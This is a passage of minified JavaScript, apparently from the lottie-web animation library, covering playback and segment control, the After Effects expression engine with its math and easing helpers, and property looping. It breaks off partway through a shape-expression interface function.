{t&&this.name!=t||(this.pause(),this.playCount=0,this._completedLoop=!1,this.setCurrentRawFrameValue(0))},AnimationItem.prototype.goToAndStop=function(t,e,i){i&&this.name!=i||(e?this.setCurrentRawFrameValue(t):this.setCurrentRawFrameValue(t*this.frameModifier),this.pause())},AnimationItem.prototype.goToAndPlay=function(t,e,i){this.goToAndStop(t,e,i),this.play()},AnimationItem.prototype.advanceTime=function(t){if(!0!==this.isPaused&&!1!==this.isLoaded){var e=this.currentRawFrame+t*this.frameModifier,i=!1;e>=this.totalFrames-1&&this.frameModifier>0?this.loop&&this.playCount!==this.loop?e>=this.totalFrames?(this.playCount+=1,this.checkSegments(e%this.totalFrames)||(this.setCurrentRawFrameValue(e%this.totalFrames),this._completedLoop=!0,this.trigger("loopComplete"))):this.setCurrentRawFrameValue(e):this.checkSegments(e>this.totalFrames?e%this.totalFrames:0)||(i=!0,e=this.totalFrames-1):e<0?this.checkSegments(e%this.totalFrames)||(!this.loop||this.playCount--<=0&&!0!==this.loop?(i=!0,e=0):(this.setCurrentRawFrameValue(this.totalFrames+e%this.totalFrames),this._completedLoop?this.trigger("loopComplete"):this._completedLoop=!0)):this.setCurrentRawFrameValue(e),i&&(this.setCurrentRawFrameValue(e),this.pause(),this.trigger("complete"))}},AnimationItem.prototype.adjustSegment=function(t,e){this.playCount=0,t[1]<t[0]?(this.frameModifier>0&&(this.playSpeed<0?this.setSpeed(-this.playSpeed):this.setDirection(-1)),this.timeCompleted=this.totalFrames=t[0]-t[1],this.firstFrame=t[1],this.setCurrentRawFrameValue(this.totalFrames-.001-e)):t[1]>t[0]&&(this.frameModifier<0&&(this.playSpeed<0?this.setSpeed(-this.playSpeed):this.setDirection(1)),this.timeCompleted=this.totalFrames=t[1]-t[0],this.firstFrame=t[0],this.setCurrentRawFrameValue(.001+e)),this.trigger("segmentStart")},AnimationItem.prototype.setSegment=function(t,e){var i=-1;this.isPaused&&(this.currentRawFrame+this.firstFrame<t?i=t:this.currentRawFrame+this.firstFrame>e&&(i=e-t)),this.firstFrame=t,this.timeCompleted=this.totalFrames=e-t,-1!==i&&this.goToAndStop(i,!0)},AnimationItem.prototype.playSegments=function(t,e){if(e&&(this.segments.length=0),"object"==typeof t[0]){var i,r=t.length;for(i=0;i<r;i+=1)this.segments.push(t[i])}else this.segments.push(t);this.segments.length&&e&&this.adjustSegment(this.segments.shift(),0),this.isPaused&&this.play()},AnimationItem.prototype.resetSegments=function(t){this.segments.length=0,this.segments.push([this.animationData.ip,this.animationData.op]),t&&this.checkSegments(0)},AnimationItem.prototype.checkSegments=function(t){return!!this.segments.length&&(this.adjustSegment(this.segments.shift(),t),!0)},AnimationItem.prototype.destroy=function(t){t&&this.name!=t||!this.renderer||(this.renderer.destroy(),this.imagePreloader.destroy(),this.trigger("destroy"),this._cbs=null,this.onEnterFrame=this.onLoopComplete=this.onComplete=this.onSegmentStart=this.onDestroy=null,this.renderer=null)},AnimationItem.prototype.setCurrentRawFrameValue=function(t){this.currentRawFrame=t,this.gotoFrame()},AnimationItem.prototype.setSpeed=function(t){this.playSpeed=t,this.updaFrameModifier()},AnimationItem.prototype.setDirection=function(t){this.playDirection=t<0?-1:1,this.updaFrameModifier()},AnimationItem.prototype.updaFrameModifier=function(){this.frameModifier=this.frameMult*this.playSpeed*this.playDirection},AnimationItem.prototype.getPath=function(){return this.path},AnimationItem.prototype.getAssetsPath=function(t){var e="";if(t.e)e=t.p;else if(this.assetsPath){var i=t.p;-1!==i.indexOf("images/")&&(i=i.split("/")[1]),e=this.assetsPath+i}else e=this.path,e+=t.u?t.u:"",e+=t.p;return e},AnimationItem.prototype.getAssetData=function(t){for(var e=0,i=this.assets.length;e<i;){if(t==this.assets[e].id)return this.assets[e];e+=1}},AnimationItem.prototype.hide=function(){this.renderer.hide()},AnimationItem.prototype.show=function(){this.renderer.show()},AnimationItem.prototype.getDuration=function(t){return t?this.totalFrames:this.totalFrames/this.frameRate},AnimationItem.prototype.trigger=function(t){if(this._cbs&&this._cbs[t])switch(t){case"enterFrame":this.triggerEvent(t,new BMEnterFrameEvent(t,this.currentFrame,this.totalFrames,this.frameModifier));break;case"loopComplete":this.triggerEvent(t,new BMCompleteLoopEvent(t,this.loop,this.playCount,this.frameMult));break;case"complete":this.triggerEvent(t,new BMCompleteEvent(t,this.frameMult));break;case"segmentStart":this.triggerEvent(t,new BMSegmentStartEvent(t,this.firstFrame,this.totalFrames));break;case"destroy":this.triggerEvent(t,new BMDestroyEvent(t,this));break;default:this.triggerEvent(t)}"enterFrame"===t&&this.onEnterFrame&&this.onEnterFrame.call(this,new BMEnterFrameEvent(t,this.currentFrame,this.totalFrames,this.frameMult)),"loopComplete"===t&&this.onLoopComplete&&this.onLoopComplete.call(this,new BMCompleteLoopEvent(t,this.loop,this.playCount,this.frameMult)),"complete"===t&&this.onComplete&&this.onComplete.call(this,new BMCompleteEvent(t,this.frameMult)),"segmentStart"===t&&this.onSegmentStart&&this.onSegmentStart.call(this,new BMSegmentStartEvent(t,this.firstFrame,this.totalFrames)),"destroy"===t&&this.onDestroy&&this.onDestroy.call(this,new BMDestroyEvent(t,this))},AnimationItem.prototype.triggerRenderFrameError=function(t){var e=new BMRenderFrameErrorEvent(t,this.currentFrame);this.triggerEvent("error",e),this.onError&&this.onError.call(this,e)},AnimationItem.prototype.triggerConfigError=function(t){var e=new BMConfigErrorEvent(t,this.currentFrame);this.triggerEvent("error",e),this.onError&&this.onError.call(this,e)};var Expressions=function(){var t={initExpressions:function(t){var e=0,i=[];t.renderer.compInterface=CompExpressionInterface(t.renderer),t.renderer.globalData.projectInterface.registerComposition(t.renderer),t.renderer.globalData.pushExpression=function(){e+=1},t.renderer.globalData.popExpression=function(){0==(e-=1)&&function(){var t,e=i.length;for(t=0;t<e;t+=1)i[t].release();i.length=0}()},t.renderer.globalData.registerExpressionProperty=function(t){-1===i.indexOf(t)&&i.push(t)}}};return t}();expressionsPlugin=Expressions;var ExpressionManager=function(){var ob={},Math=BMMath,window=null,document=null;function $bm_isInstanceOfArray(t){return t.constructor===Array||t.constructor===Float32Array}function isNumerable(t,e){return"number"===t||"boolean"===t||"string"===t||e instanceof Number}function $bm_neg(t){var e=typeof t;if("number"===e||"boolean"===e||t instanceof Number)return-t;if($bm_isInstanceOfArray(t)){var i,r=t.length,n=[];for(i=0;i<r;i+=1)n[i]=-t[i];return n}return t.propType?t.v:void 0}var easeInBez=BezierFactory.getBezierEasing(.333,0,.833,.833,"easeIn").get,easeOutBez=BezierFactory.getBezierEasing(.167,.167,.667,1,"easeOut").get,easeInOutBez=BezierFactory.getBezierEasing(.33,0,.667,1,"easeInOut").get;function sum(t,e){var i=typeof t,r=typeof e;if("string"===i||"string"===r||isNumerable(i,t)&&isNumerable(r,e))return t+e;if($bm_isInstanceOfArray(t)&&isNumerable(r,e))return(t=t.slice(0))[0]=t[0]+e,t;if(isNumerable(i,t)&&$bm_isInstanceOfArray(e))return(e=e.slice(0))[0]=t+e[0],e;if($bm_isInstanceOfArray(t)&&$bm_isInstanceOfArray(e)){for(var n=0,s=t.length,o=e.length,a=[];n<s||n<o;)("number"==typeof t[n]||t[n]instanceof Number)&&("number"==typeof e[n]||e[n]instanceof Number)?a[n]=t[n]+e[n]:a[n]=void 0===e[n]?t[n]:t[n]||e[n],n+=1;return a}return 0}var add=sum;function sub(t,e){var i=typeof t,r=typeof e;if(isNumerable(i,t)&&isNumerable(r,e))return"string"===i&&(t=parseInt(t)),"string"===r&&(e=parseInt(e)),t-e;if($bm_isInstanceOfArray(t)&&isNumerable(r,e))return(t=t.slice(0))[0]=t[0]-e,t;if(isNumerable(i,t)&&$bm_isInstanceOfArray(e))return(e=e.slice(0))[0]=t-e[0],e;if($bm_isInstanceOfArray(t)&&$bm_isInstanceOfArray(e)){for(var n=0,s=t.length,o=e.length,a=[];n<s||n<o;)("number"==typeof t[n]||t[n]instanceof Number)&&("number"==typeof e[n]||e[n]instanceof Number)?a[n]=t[n]-e[n]:a[n]=void 0===e[n]?t[n]:t[n]||e[n],n+=1;return a}return 0}function mul(t,e){var i,r,n,s=typeof t,o=typeof e;if(isNumerable(s,t)&&isNumerable(o,e))return t*e;if($bm_isInstanceOfArray(t)&&isNumerable(o,e)){for(n=t.length,i=createTypedArray("float32",n),r=0;r<n;r+=1)i[r]=t[r]*e;return i}if(isNumerable(s,t)&&$bm_isInstanceOfArray(e)){for(n=e.length,i=createTypedArray("float32",n),r=0;r<n;r+=1)i[r]=t*e[r];return i}return 0}function div(t,e){var i,r,n,s=typeof t,o=typeof e;if(isNumerable(s,t)&&isNumerable(o,e))return t/e;if($bm_isInstanceOfArray(t)&&isNumerable(o,e)){for(n=t.length,i=createTypedArray("float32",n),r=0;r<n;r+=1)i[r]=t[r]/e;return i}if(isNumerable(s,t)&&$bm_isInstanceOfArray(e)){for(n=e.length,i=createTypedArray("float32",n),r=0;r<n;r+=1)i[r]=t/e[r];return i}return 0}function mod(t,e){return"string"==typeof t&&(t=parseInt(t)),"string"==typeof e&&(e=parseInt(e)),t%e}var $bm_sum=sum,$bm_sub=sub,$bm_mul=mul,$bm_div=div,$bm_mod=mod;function clamp(t,e,i){if(e>i){var r=i;i=e,e=r}return Math.min(Math.max(t,e),i)}function radiansToDegrees(t){return t/degToRads}var radians_to_degrees=radiansToDegrees;function degreesToRadians(t){return t*degToRads}var degrees_to_radians=radiansToDegrees,helperLengthArray=[0,0,0,0,0,0];function length(t,e){if("number"==typeof t||t instanceof Number)return e=e||0,Math.abs(t-e);e||(e=helperLengthArray);var i,r=Math.min(t.length,e.length),n=0;for(i=0;i<r;i+=1)n+=Math.pow(e[i]-t[i],2);return Math.sqrt(n)}function normalize(t){return div(t,length(t))}function rgbToHsl(t){var e,i,r=t[0],n=t[1],s=t[2],o=Math.max(r,n,s),a=Math.min(r,n,s),l=(o+a)/2;if(o==a)e=i=0;else{var h=o-a;switch(i=l>.5?h/(2-o-a):h/(o+a),o){case r:e=(n-s)/h+(n<s?6:0);break;case n:e=(s-r)/h+2;break;case s:e=(r-n)/h+4}e/=6}return[e,i,l,t[3]]}function hue2rgb(t,e,i){return i<0&&(i+=1),i>1&&(i-=1),i<1/6?t+6*(e-t)*i:i<.5?e:i<2/3?t+(e-t)*(2/3-i)*6:t}function hslToRgb(t){var e,i,r,n=t[0],s=t[1],o=t[2];if(0===s)e=i=r=o;else{var a=o<.5?o*(1+s):o+s-o*s,l=2*o-a;e=hue2rgb(l,a,n+1/3),i=hue2rgb(l,a,n),r=hue2rgb(l,a,n-1/3)}return[e,i,r,t[3]]}function linear(t,e,i,r,n){if((void 0===r||void 0===n)&&(r=e,n=i,e=0,i=1),i<e){var s=i;i=e,e=s}if(t<=e)return r;if(t>=i)return n;var o=i===e?0:(t-e)/(i-e);if(!r.length)return r+(n-r)*o;var a,l=r.length,h=createTypedArray("float32",l);for(a=0;a<l;a+=1)h[a]=r[a]+(n[a]-r[a])*o;return h}function random(t,e){if(void 0===e&&(void 0===t?(t=0,e=1):(e=t,t=void 0)),e.length){var i,r=e.length;t||(t=createTypedArray("float32",r));var n=createTypedArray("float32",r),s=BMMath.random();for(i=0;i<r;i+=1)n[i]=t[i]+s*(e[i]-t[i]);return n}return void 0===t&&(t=0),t+BMMath.random()*(e-t)}function createPath(t,e,i,r){var n,s=t.length,o=shape_pool.newElement();o.setPathData(!!r,s);var a,l,h=[0,0];for(n=0;n<s;n+=1)a=e&&e[n]?e[n]:h,l=i&&i[n]?i[n]:h,o.setTripleAt(t[n][0],t[n][1],l[0]+t[n][0],l[1]+t[n][1],a[0]+t[n][0],a[1]+t[n][1],n,!0);return o}function initiateExpression(elem,data,property){var val=data.x,needsVelocity=/velocity(?![\w\d])/.test(val),_needsRandom=-1!==val.indexOf("random"),elemType=elem.data.ty,transform,$bm_transform,content,effect,thisProperty=property;thisProperty.valueAtTime=thisProperty.getValueAtTime,Object.defineProperty(thisProperty,"value",{get:function(){return thisProperty.v}}),elem.comp.frameDuration=1/elem.comp.globalData.frameRate,elem.comp.displayStartTime=0;var inPoint=elem.data.ip/elem.comp.globalData.frameRate,outPoint=elem.data.op/elem.comp.globalData.frameRate,width=elem.data.sw?elem.data.sw:0,height=elem.data.sh?elem.data.sh:0,name=elem.data.nm,loopIn,loop_in,loopOut,loop_out,smooth,toWorld,fromWorld,fromComp,toComp,fromCompToSurface,position,rotation,anchorPoint,scale,thisLayer,thisComp,mask,valueAtTime,velocityAtTime,__expression_functions=[];if(data.xf){var i,len=data.xf.length;for(i=0;i<len;i+=1)__expression_functions[i]=eval("(function(){ return "+data.xf[i]+"}())")}var scoped_bm_rt,expression_function=eval("[function _expression_function(){"+val+";scoped_bm_rt=$bm_rt}]")[0],numKeys=property.kf?data.k.length:0,active=!this.data||!0!==this.data.hd,wiggle=function(t,e){var i,r,n=this.pv.length?this.pv.length:1,s=createTypedArray("float32",n),o=Math.floor(5*time);for(i=0,r=0;i<o;){for(r=0;r<n;r+=1)s[r]+=-e+2*e*BMMath.random();i+=1}var a=5*time,l=a-Math.floor(a),h=createTypedArray("float32",n);if(n>1){for(r=0;r<n;r+=1)h[r]=this.pv[r]+s[r]+(-e+2*e*BMMath.random())*l;return h}return this.pv+s[0]+(-e+2*e*BMMath.random())*l}.bind(this);function loopInDuration(t,e){return loopIn(t,e,!0)}function loopOutDuration(t,e){return loopOut(t,e,!0)}thisProperty.loopIn&&(loopIn=thisProperty.loopIn.bind(thisProperty),loop_in=loopIn),thisProperty.loopOut&&(loopOut=thisProperty.loopOut.bind(thisProperty),loop_out=loopOut),thisProperty.smooth&&(smooth=thisProperty.smooth.bind(thisProperty)),this.getValueAtTime&&(valueAtTime=this.getValueAtTime.bind(this)),this.getVelocityAtTime&&(velocityAtTime=this.getVelocityAtTime.bind(this));var comp=elem.comp.globalData.projectInterface.bind(elem.comp.globalData.projectInterface);function lookAt(t,e){var i=[e[0]-t[0],e[1]-t[1],e[2]-t[2]],r=Math.atan2(i[0],Math.sqrt(i[1]*i[1]+i[2]*i[2]))/degToRads;return[-Math.atan2(i[1],i[2])/degToRads,r,0]}function easeOut(t,e,i,r,n){return applyEase(easeOutBez,t,e,i,r,n)}function easeIn(t,e,i,r,n){return applyEase(easeInBez,t,e,i,r,n)}function ease(t,e,i,r,n){return applyEase(easeInOutBez,t,e,i,r,n)}function applyEase(t,e,i,r,n,s){void 0===n?(n=i,s=r):e=(e-i)/(r-i);var o=t(e=e>1?1:e<0?0:e);if($bm_isInstanceOfArray(n)){var a,l=n.length,h=createTypedArray("float32",l);for(a=0;a<l;a+=1)h[a]=(s[a]-n[a])*o+n[a];return h}return(s-n)*o+n}function nearestKey(t){var e,i,r,n=data.k.length;if(data.k.length&&"number"!=typeof data.k[0])if(i=-1,(t*=elem.comp.globalData.frameRate)<data.k[0].t)i=1,r=data.k[0].t;else{for(e=0;e<n-1;e+=1){if(t===data.k[e].t){i=e+1,r=data.k[e].t;break}if(t>data.k[e].t&&t<data.k[e+1].t){t-data.k[e].t>data.k[e+1].t-t?(i=e+2,r=data.k[e+1].t):(i=e+1,r=data.k[e].t);break}}-1===i&&(i=e+1,r=data.k[e].t)}else i=0,r=0;var s={};return s.index=i,s.time=r/elem.comp.globalData.frameRate,s}function key(t){var e,i,r;if(!data.k.length||"number"==typeof data.k[0])throw new Error("The property has no keyframe at index "+t);t-=1,e={time:data.k[t].t/elem.comp.globalData.frameRate,value:[]};var n=data.k[t].hasOwnProperty("s")?data.k[t].s:data.k[t-1].e;for(r=n.length,i=0;i<r;i+=1)e[i]=n[i],e.value[i]=n[i];return e}function framesToTime(t,e){return e||(e=elem.comp.globalData.frameRate),t/e}function timeToFrames(t,e){return!t&&0!==t&&(t=time),e||(e=elem.comp.globalData.frameRate),t*e}function seedRandom(t){BMMath.seedrandom(randSeed+t)}function sourceRectAtTime(){return elem.sourceRectAtTime()}function substring(t,e){return"string"==typeof value?void 0===e?value.substring(t):value.substring(t,e):""}function substr(t,e){return"string"==typeof value?void 0===e?value.substr(t):value.substr(t,e):""}function posterizeTime(t){time=0===t?0:Math.floor(time*t)/t,value=valueAtTime(time)}var time,velocity,value,text,textIndex,textTotal,selectorValue,index=elem.data.ind,hasParent=!(!elem.hierarchy||!elem.hierarchy.length),parent,randSeed=Math.floor(1e6*Math.random()),globalData=elem.globalData;function executeExpression(t){return value=t,_needsRandom&&seedRandom(randSeed),this.frameExpressionId===elem.globalData.frameId&&"textSelector"!==this.propType?value:("textSelector"===this.propType&&(textIndex=this.textIndex,textTotal=this.textTotal,selectorValue=this.selectorValue),thisLayer||(text=elem.layerInterface.text,thisLayer=elem.layerInterface,thisComp=elem.comp.compInterface,toWorld=thisLayer.toWorld.bind(thisLayer),fromWorld=thisLayer.fromWorld.bind(thisLayer),fromComp=thisLayer.fromComp.bind(thisLayer),toComp=thisLayer.toComp.bind(thisLayer),mask=thisLayer.mask?thisLayer.mask.bind(thisLayer):null,fromCompToSurface=fromComp),transform||(transform=elem.layerInterface("ADBE Transform Group"),$bm_transform=transform,transform&&(anchorPoint=transform.anchorPoint)),4===elemType&&!content&&(content=thisLayer("ADBE Root Vectors Group")),effect||(effect=thisLayer(4)),(hasParent=!(!elem.hierarchy||!elem.hierarchy.length))&&!parent&&(parent=elem.hierarchy[0].layerInterface),time=this.comp.renderedFrame/this.comp.globalData.frameRate,needsVelocity&&(velocity=velocityAtTime(time)),expression_function(),this.frameExpressionId=elem.globalData.frameId,"shape"===scoped_bm_rt.propType&&(scoped_bm_rt=scoped_bm_rt.v),scoped_bm_rt)}return executeExpression}return ob.initiateExpression=initiateExpression,ob}(),expressionHelpers={searchExpressions:function(t,e,i){e.x&&(i.k=!0,i.x=!0,i.initiateExpression=ExpressionManager.initiateExpression,i.effectsSequence.push(i.initiateExpression(t,e,i).bind(i)))},getSpeedAtTime:function(t){var e=this.getValueAtTime(t),i=this.getValueAtTime(t+-.01),r=0;if(e.length){var n;for(n=0;n<e.length;n+=1)r+=Math.pow(i[n]-e[n],2);r=100*Math.sqrt(r)}else r=0;return r},getVelocityAtTime:function(t){if(void 0!==this.vel)return this.vel;var e,i,r=-.001,n=this.getValueAtTime(t),s=this.getValueAtTime(t+r);if(n.length)for(e=createTypedArray("float32",n.length),i=0;i<n.length;i+=1)e[i]=(s[i]-n[i])/r;else e=(s-n)/r;return e},getValueAtTime:function(t){return t*=this.elem.globalData.frameRate,(t-=this.offsetTime)!==this._cachingAtTime.lastFrame&&(this._cachingAtTime.lastIndex=this._cachingAtTime.lastFrame<t?this._cachingAtTime.lastIndex:0,this._cachingAtTime.value=this.interpolateValue(t,this._cachingAtTime),this._cachingAtTime.lastFrame=t),this._cachingAtTime.value},getStaticValueAtTime:function(){return this.pv},setGroupProperty:function(t){this.propertyGroup=t}};(function(){function t(t,e,i){if(!this.k||!this.keyframes)return this.pv;t=t?t.toLowerCase():"";var r,n,s,o,a,l=this.comp.renderedFrame,h=this.keyframes,c=h[h.length-1].t;if(l<=c)return this.pv;if(i?n=c-(r=e?Math.abs(c-elem.comp.globalData.frameRate*e):Math.max(0,c-this.elem.data.ip)):((!e||e>h.length-1)&&(e=h.length-1),r=c-(n=h[h.length-1-e].t)),"pingpong"===t){if(Math.floor((l-n)/r)%2!=0)return this.getValueAtTime((r-(l-n)%r+n)/this.comp.globalData.frameRate,0)}else{if("offset"===t){var u=this.getValueAtTime(n/this.comp.globalData.frameRate,0),d=this.getValueAtTime(c/this.comp.globalData.frameRate,0),p=this.getValueAtTime(((l-n)%r+n)/this.comp.globalData.frameRate,0),m=Math.floor((l-n)/r);if(this.pv.length){for(o=(a=new Array(u.length)).length,s=0;s<o;s+=1)a[s]=(d[s]-u[s])*m+p[s];return a}return(d-u)*m+p}if("continue"===t){var f=this.getValueAtTime(c/this.comp.globalData.frameRate,0),g=this.getValueAtTime((c-.001)/this.comp.globalData.frameRate,0);if(this.pv.length){for(o=(a=new Array(f.length)).length,s=0;s<o;s+=1)a[s]=f[s]+(f[s]-g[s])*((l-c)/this.comp.globalData.frameRate)/5e-4;return a}return f+(l-c)/.001*(f-g)}}return this.getValueAtTime(((l-n)%r+n)/this.comp.globalData.frameRate,0)}function e(t,e,i){if(!this.k)return this.pv;t=t?t.toLowerCase():"";var r,n,s,o,a,l=this.comp.renderedFrame,h=this.keyframes,c=h[0].t;if(l>=c)return this.pv;if(i?n=c+(r=e?Math.abs(elem.comp.globalData.frameRate*e):Math.max(0,this.elem.data.op-c)):((!e||e>h.length-1)&&(e=h.length-1),r=(n=h[e].t)-c),"pingpong"===t){if(Math.floor((c-l)/r)%2==0)return this.getValueAtTime(((c-l)%r+c)/this.comp.globalData.frameRate,0)}else{if("offset"===t){var u=this.getValueAtTime(c/this.comp.globalData.frameRate,0),d=this.getValueAtTime(n/this.comp.globalData.frameRate,0),p=this.getValueAtTime((r-(c-l)%r+c)/this.comp.globalData.frameRate,0),m=Math.floor((c-l)/r)+1;if(this.pv.length){for(o=(a=new Array(u.length)).length,s=0;s<o;s+=1)a[s]=p[s]-(d[s]-u[s])*m;return a}return p-(d-u)*m}if("continue"===t){var f=this.getValueAtTime(c/this.comp.globalData.frameRate,0),g=this.getValueAtTime((c+.001)/this.comp.globalData.frameRate,0);if(this.pv.length){for(o=(a=new Array(f.length)).length,s=0;s<o;s+=1)a[s]=f[s]+(f[s]-g[s])*(c-l)/.001;return a}return f+(f-g)*(c-l)/.001}}return this.getValueAtTime((r-(c-l)%r+c)/this.comp.globalData.frameRate,0)}function i(t,e){if(!this.k)return this.pv;if(t=.5*(t||.4),(e=Math.floor(e||5))<=1)return this.pv;var i,r,n=this.comp.renderedFrame/this.comp.globalData.frameRate,s=n-t,o=e>1?(n+t-s)/(e-1):1,a=0,l=0;for(i=this.pv.length?createTypedArray("float32",this.pv.length):0;a<e;){if(r=this.getValueAtTime(s+a*o),this.pv.length)for(l=0;l<this.pv.length;l+=1)i[l]+=r[l];else i+=r;a+=1}if(this.pv.length)for(l=0;l<this.pv.length;l+=1)i[l]/=e;else i/=e;return i}function r(t){console.warn("Transform at time not supported")}function n(t){}var s=TransformPropertyFactory.getTransformProperty;TransformPropertyFactory.getTransformProperty=function(t,e,i){var o=s(t,e,i);return o.dynamicProperties.length?o.getValueAtTime=r.bind(o):o.getValueAtTime=n.bind(o),o.setGroupProperty=expressionHelpers.setGroupProperty,o};var o=PropertyFactory.getProp;PropertyFactory.getProp=function(r,n,s,a,l){var h=o(r,n,s,a,l);h.kf?h.getValueAtTime=expressionHelpers.getValueAtTime.bind(h):h.getValueAtTime=expressionHelpers.getStaticValueAtTime.bind(h),h.setGroupProperty=expressionHelpers.setGroupProperty,h.loopOut=t,h.loopIn=e,h.smooth=i,h.getVelocityAtTime=expressionHelpers.getVelocityAtTime.bind(h),h.getSpeedAtTime=expressionHelpers.getSpeedAtTime.bind(h),h.numKeys=1===n.a?n.k.length:0,h.propertyIndex=n.ix;var c=0;return 0!==s&&(c=createTypedArray("float32",1===n.a?n.k[0].s.length:n.k.length)),h._cachingAtTime={lastFrame:initialDefaultFrame,lastIndex:0,value:c},expressionHelpers.searchExpressions(r,n,h),h.k&&l.addDynamicProperty(h),h};var a=ShapePropertyFactory.getConstructorFunction(),l=ShapePropertyFactory.getKeyframedConstructorFunction();function h(){}h.prototype={vertices:function(t,e){this.k&&this.getValue();var i=this.v;void 0!==e&&(i=this.getValueAtTime(e,0));var r,n=i._length,s=i[t],o=i.v,a=createSizedArray(n);for(r=0;r<n;r+=1)a[r]="i"===t||"o"===t?[s[r][0]-o[r][0],s[r][1]-o[r][1]]:[s[r][0],s[r][1]];return a},points:function(t){return this.vertices("v",t)},inTangents:function(t){return this.vertices("i",t)},outTangents:function(t){return this.vertices("o",t)},isClosed:function(){return this.v.c},pointOnPath:function(t,e){var i=this.v;void 0!==e&&(i=this.getValueAtTime(e,0)),this._segmentsLength||(this._segmentsLength=bez.getSegmentsLength(i));for(var r,n=this._segmentsLength,s=n.lengths,o=n.totalLength*t,a=0,l=s.length,h=0;a<l;){if(h+s[a].addedLength>o){var c=a,u=i.c&&a===l-1?0:a+1,d=(o-h)/s[a].addedLength;r=bez.getPointInSegment(i.v[c],i.v[u],i.o[c],i.i[u],d,s[a]);break}h+=s[a].addedLength,a+=1}return r||(r=i.c?[i.v[0][0],i.v[0][1]]:[i.v[i._length-1][0],i.v[i._length-1][1]]),r},vectorOnPath:function(t,e,i){t=1==t?this.v.c?0:.999:t;var r=this.pointOnPath(t,e),n=this.pointOnPath(t+.001,e),s=n[0]-r[0],o=n[1]-r[1],a=Math.sqrt(Math.pow(s,2)+Math.pow(o,2));return 0===a?[0,0]:"tangent"===i?[s/a,o/a]:[-o/a,s/a]},tangentOnPath:function(t,e){return this.vectorOnPath(t,e,"tangent")},normalOnPath:function(t,e){return this.vectorOnPath(t,e,"normal")},setGroupProperty:expressionHelpers.setGroupProperty,getValueAtTime:expressionHelpers.getStaticValueAtTime},extendPrototype([h],a),extendPrototype([h],l),l.prototype.getValueAtTime=function(t){return this._cachingAtTime||(this._cachingAtTime={shapeValue:shape_pool.clone(this.pv),lastIndex:0,lastTime:initialDefaultFrame}),t*=this.elem.globalData.frameRate,(t-=this.offsetTime)!==this._cachingAtTime.lastTime&&(this._cachingAtTime.lastIndex=this._cachingAtTime.lastTime<t?this._caching.lastIndex:0,this._cachingAtTime.lastTime=t,this.interpolateShape(t,this._cachingAtTime.shapeValue,this._cachingAtTime)),this._cachingAtTime.shapeValue},l.prototype.initiateExpression=ExpressionManager.initiateExpression;var c=ShapePropertyFactory.getShapeProp;ShapePropertyFactory.getShapeProp=function(t,e,i,r,n){var s=c(t,e,i,r,n);return s.propertyIndex=e.ix,s.lock=!1,3===i?expressionHelpers.searchExpressions(t,e.pt,s):4===i&&expressionHelpers.searchExpressions(t,e.ks,s),s.k&&t.addDynamicProperty(s),s}})(),TextProperty.prototype.getExpressionValue=function(t,e){var i=this.calculateExpression(e);if(t.t!==i){var r={};return this.copyData(r,t),r.t=i.toString(),r.__complete=!1,r}return t},TextProperty.prototype.searchProperty=function(){var t=this.searchKeyframes(),e=this.searchExpressions();return this.kf=t||e,this.kf},TextProperty.prototype.searchExpressions=function(){if(this.data.d.x)return this.calculateExpression=ExpressionManager.initiateExpression.bind(this)(this.elem,this.data.d,this),this.addEffect(this.getExpressionValue.bind(this)),!0};var ShapeExpressionInterface=function(){function t(t,u,d){var p,m=[],f=t?t.length:0;for(p=0;p<f;p+=1)"gr"==t[p].ty?m.push(e(t[p],u[p],d)):"fl"==t[p].ty?m.push(i(t[p],u[p],d)):"st"==t[p].ty?m.push(r(t[p],u[p],d)):"tm"==t[p].ty?m.push(n(t[p],u[p],d)):"tr"==t[p].ty||("el"==t[p].ty?m.push(s(t[p],u[p],d)):"sr"==t[p].ty?m.push(o(t[p],u[p],d)):"sh"==t[p].ty?m.push(c(t[p],u[p],d)):"rc"==t[p].ty?m.push(a(t[p],u[p],d)):"rd"==t[p].ty?m.push(l(t[p],u[p],d)):"rp"==t[p].ty&&m.push(h(t[p],u[p],d)));return m}function e(e,i,r){var n=function(t){switch(t){case"ADBE Vectors Group":case"Contents":case 2:return n.content;default:return n.transform}};n.propertyGroup=function(t){return 1===t?n:r(t-1)};var s=function(e,i,r){var n,s=function(t){for(var e=0,i=n.length;e<i;){if(n[e]._name===t||n[e].mn===t||n[e].propertyIndex===t||n[e].ix===t||n[e].ind===t)return n[e];e+=1}if("number"==typeof t)return n[t-1]};return s.propertyGroup=function(t){return 1===t?s:r(t-1)},n=t(e.it,i.it,s.propertyGroup),s.numProperties=n.length,s.propertyIndex=e.cix,s._name=e.nm,s}(e,i,n.propertyGroup),o=function(t,e,i){function r(t){return 1==t?n:i(--t)}function n(e){return t.a.ix===e||"Anchor Point"===e?n.anchorPoint:t.o.ix===e||"Opacity"===e?n.opacity:t.p.ix===e||"Position"===e?n.position:t.r.ix===e||"Rotation"===e||"ADBE Vector Rotation"===e?n.rotation:t.s.ix===e||"Scale"===e?n.scale:t.sk&&t.sk.ix===e||"Skew"===e?n.skew:t.sa&&t.sa.ix===e||"Skew Axis"===e?n.skewAxis:void 0}return e.transform.mProps.o.setGroupProperty(r),e.transform.mProps.p.setGroupProperty(r),e.transform.mProps.a.setGroupProperty(r),e.transform.mProps.s.setGroupProperty(r),e.transform.mProps.r.setGroupProperty(r),e.transform.mProps.sk&&(e.transform.mProps.sk.setGroupProperty(r),e.transform.mProps.sa.setGroupProperty(r)),e.transform.op.setGroupProperty(r),Object.defineProperties(n,{opacity:{get:ExpressionPropertyInterface(e.transform.mProps.o)},position:{get:ExpressionPropertyInterface(e.transform.mProps.p)},anchorPoint:{get:ExpressionPropertyInterface(e.transform.mProps.a)},scale:{get:ExpressionPropertyInterface(e.transform.mProps.s)},rotation:{get:ExpressionPropertyInterface(e.transform.mProps.r)},skew:{get:ExpressionPropertyInterface(e.transform.mProps.sk)},skewAxis:{get:ExpressionPropertyInterface(e.transform.mProps.sa)},_name:{value:t.nm}}),n.ty="tr",n.mn=t.mn,n.propertyGroup=i,n}(e.it[e.it.length-1],i.it[i.it.length-1],n.propertyGroup);return n.content=s,n.transform=o,Object.defineProperty(n,"_name",{get:function(){return e.nm}}),n.numProperties=e.np,n.propertyIndex=e.ix,n.nm=e.nm,n.mn=e.mn,n}function i(t,e,i){function r(t){return"Color"===t||"color"===t?r.color:"Opacity"===t||"opacity"===t?r.opacity:void 0}return Object.defineProperties(r,{color:{get:ExpressionPropertyInterface(e.c)},opacity:{get:ExpressionPropertyInterface(e.o)},_name:{value:t.nm},mn:{value:t.mn}}),e.c.setGroupProperty(i),e.o.setGroupProperty(i),r}function r(t,e,i){function r(t){return 1===t?ob:i(t-1)}function n(t){return 